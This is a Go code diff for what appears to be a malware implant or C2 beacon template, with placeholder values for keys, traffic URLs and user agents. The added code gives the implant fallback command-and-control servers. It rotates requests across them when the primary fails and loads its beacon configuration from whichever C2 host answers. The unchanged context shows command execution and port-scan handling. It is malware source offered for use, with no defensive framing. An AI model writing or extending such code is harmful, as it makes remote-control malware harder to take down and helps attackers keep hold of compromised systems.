@@ -70,6 +70,35 @@ var USER_AGENTS = []string{
     "{user_agent_3}",
 }
 
+var C2_FALLBACK_URLS = []string{
+    {c2_fallback_urls},
+}
+
+func c2Candidates(url string) []string {
+    if !strings.HasPrefix(url, C2_URL) {
+        return []string{url}
+    }
+    suffix := strings.TrimPrefix(url, C2_URL)
+    candidates := []string{url}
+    for _, fallback := range C2_FALLBACK_URLS {
+        fallback = strings.TrimSpace(fallback)
+        if fallback == "" || fallback == C2_URL {
+            continue
+        }
+        duplicate := false
+        for _, existing := range candidates {
+            if existing == fallback+suffix {
+                duplicate = true
+                break
+            }
+        }
+        if !duplicate {
+            candidates = append(candidates, fallback+suffix)
+        }
+    }
+    return candidates
+}
+
 var URLS = []string{
     "{url_trafic_1}",
     "{url_trafic_2}",
@@ -1665,12 +1694,15 @@ func sendRequest(ctx context.Context, url, method, body string, filePath string)
 }
 
 func retryRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
+    candidates := c2Candidates(url)
     for i := 0; i < MAX_RETRIES; i++ {
-        resp, err := sendRequest(ctx, url, method, body, filePath)
-        if err == nil {
-            return resp, nil
+        for _, candidate := range candidates {
+            resp, err := sendRequest(ctx, candidate, method, body, filePath)
+            if err == nil {
+                return resp, nil
+            }
+            fmt.Printf("[RETRY] Attempt %d/%d candidate %s: %v\n", i+1, MAX_RETRIES, candidate, err)
         }
-        fmt.Printf("[RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
         select {
         case <-ctx.Done():
             return nil, ctx.Err()
@@ -1678,6 +1710,22 @@ func retryRequest(ctx context.Context, url, method, body string, filePath string
         }
     }
     return nil, fmt.Errorf("max retries reached")
+}
+
+func loadBeaconConfig(lazyconf *LazyDataType) error {
+    primary := C2_URL + "/config.json"
+    var lastErr error
+    for _, candidate := range c2Candidates(primary) {
+        if err := ReadJSONFromURL(candidate, lazyconf); err == nil {
+            return nil
+        } else {
+            lastErr = err
+        }
+    }
+    if lastErr == nil {
+        lastErr = fmt.Errorf("no C2 candidate reachable")
+    }
+    return lastErr
 }
 
 func executeCommandWithRetry(shellCommand []string, command string) (string, error) {
@@ -1751,9 +1799,7 @@ func main() {
     keyHex := "{key}"
     var lazyconf LazyDataType
     var currentPortScanResults map[string][]int
-    url := C2_URL + "/config.json"
-        
-    err := ReadJSONFromURL(url, &lazyconf)
+    err := loadBeaconConfig(&lazyconf)
 	if err != nil {
         fmt.Println("[FATAL] Config read error:", err)
 		return
